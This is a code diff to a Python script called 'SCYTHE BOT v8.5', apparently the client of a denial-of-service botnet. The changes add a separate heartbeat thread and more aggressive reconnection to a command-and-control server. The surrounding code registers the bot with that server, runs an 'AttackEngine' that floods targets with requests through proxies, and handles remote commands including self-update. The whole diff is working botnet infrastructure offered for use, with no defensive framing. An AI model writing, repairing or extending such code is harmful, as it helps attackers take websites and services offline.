@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 """
-SCYTHE BOT v8.4 — FULLY SYNCED, THREAD-SAFE & FULLY LOGGED
+SCYTHE BOT v8.5 — HEARTBEAT THREAD + AGGRESSIVE RECONNECT
 Fixes:
-- Thread-safe socket send (sock_lock)
-- Heartbeat logging every send
-- all_stopped -> attack_stopped message for C2 compatibility
-- AttackEngine always sends final report even on crash
-- Workers check stop_flag aggressively
+- Dedicated heartbeat thread (independent of main recv loop)
+- Aggressive auto-reconnect on any failure
+- Thread-safe socket with explicit lock
+- Better command parsing and error handling
 """
 
 import socket
@@ -69,8 +68,16 @@ def signal_handler(signum, frame):
 signal.signal(signal.SIGTERM, signal_handler)
 signal.signal(signal.SIGINT, signal_handler)
 
-# ========== THREAD-SAFE SOCKET LOCK ==========
+# ========== THREAD-SAFE SOCKET ==========
 _sock_lock = threading.Lock()
+_current_sock = None
+
+def set_current_sock(sock):
+    global _current_sock
+    _current_sock = sock
+
+def get_current_sock():
+    return _current_sock
 
 def check_and_adjust_limits(desired_threads):
     try:
@@ -272,6 +279,7 @@ def connect_to_c2():
                 pass
             s.connect((C2_IP, C2_PORT))
             log("✅ Connected to C2!")
+            set_current_sock(s)
             with _sock_lock:
                 s.sendall(json.dumps({"type": "register", "id": BOT_ID, "threads": THREADS, "rps_limit": RPS_LIMIT}).encode('utf-8') + b"\n")
                 s.sendall(json.dumps({"type": "heartbeat", "id": BOT_ID, "time": int(time.time())}).encode('utf-8') + b"\n")
@@ -294,6 +302,24 @@ def send_report(sock, report):
     except Exception as e:
         log(f"📤 Send report error: {e}", logging.WARNING)
         return False
+
+# ========== HEARTBEAT THREAD ==========
+_heartbeat_thread = None
+_heartbeat_stop = threading.Event()
+
+def heartbeat_loop(sock):
+    """Dedicated thread for sending heartbeats every 5 seconds."""
+    while not _heartbeat_stop.is_set() and not _shutdown_event.is_set():
+        time.sleep(heartbeat_interval)
+        if _heartbeat_stop.is_set() or _shutdown_event.is_set():
+            break
+        with _sock_lock:
+            hb_result = send_report(sock, {"type": "heartbeat", "id": BOT_ID, "time": time.time()})
+        if hb_result:
+            log("💓 Heartbeat sent to C2")
+        else:
+            log("⚠️ Heartbeat failed, will reconnect...")
+            break
 
 class HybridRateLimiter:
     def __init__(self, rate_per_second):
@@ -445,7 +471,6 @@ class AttackEngine(threading.Thread):
             elapsed = max(1, time.time() - self.start_time) if self.start_time else 1
             final_rps = self.total_requests // elapsed
             log(f"[ENGINE] ✅ Attack {self.attack_id} finished | Total: {self.total_requests} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Direct: {self.direct_requests} | Avg RPS: {final_rps} | Crashed: {self._crashed}")
-            # ALWAYS send final report
             self._send_final_report(final_rps)
 
     def _send_final_report(self, final_rps):
@@ -713,7 +738,7 @@ class AttackEngine(threading.Thread):
         self.stop_flag.set()
 
 def handle_command(sock, cmd_json):
-    global proxy_list
+    global proxy_list, _heartbeat_thread, _heartbeat_stop
     try:
         data = json.loads(cmd_json)
         cmd = data.get("cmd", "").lower()
@@ -847,6 +872,7 @@ def handle_command(sock, cmd_json):
                     log(f"❌ Self-update failed: {e}")
         elif cmd == "exit":
             log("👋 Exit command received. Goodbye!")
+            _heartbeat_stop.set()
             sock.close()
             sys.exit(0)
         else:
@@ -859,7 +885,7 @@ def handle_command(sock, cmd_json):
         log(f"Traceback: {traceback.format_exc()}", logging.ERROR)
 
 def main():
-    global read_buffer
+    global read_buffer, _heartbeat_thread, _heartbeat_stop
     log(f"🚀 Bot started. ID: {BOT_ID} | Threads: {THREADS} | RPS Limit: {RPS_LIMIT} | Bandwidth Limit: {BANDWIDTH_LIMIT_MB}MB | PROXY-FIRST | 12H STABLE | C2: {C2_IP}:{C2_PORT}")
     while not _shutdown_event.is_set():
         sock = connect_to_c2()
@@ -868,9 +894,13 @@ def main():
             time.sleep(5)
             continue
         read_buffer = ""
+        # Start heartbeat thread
+        _heartbeat_stop.clear()
+        _heartbeat_thread = threading.Thread(target=heartbeat_loop, args=(sock,), daemon=True)
+        _heartbeat_thread.start()
+        log("💓 Heartbeat thread started")
         try:
             while not _shutdown_event.is_set():
-                sock.settimeout(heartbeat_interval)
                 try:
                     chunk = sock.recv(4096).decode('utf-8', errors='ignore')
                     if not chunk:
@@ -883,18 +913,17 @@ def main():
                         if line:
                             handle_command(sock, line)
                 except socket.timeout:
-                    with _sock_lock:
-                        hb_result = send_report(sock, {"type": "heartbeat", "id": BOT_ID, "time": time.time()})
-                    if not hb_result:
-                        log("⚠️ Heartbeat failed, reconnecting...")
-                        break
-                    log("💓 Heartbeat sent to C2")
+                    # Heartbeat handled by separate thread, just continue
                     continue
                 except Exception as e:
                     log(f"❌ Recv error: {e}", logging.WARNING)
                     break
         except Exception as e:
             log(f"💥 Connection error: {e}", logging.ERROR)
+        # Cleanup
+        _heartbeat_stop.set()
+        if _heartbeat_thread:
+            _heartbeat_thread.join(timeout=2)
         try:
             sock.close()
         except:
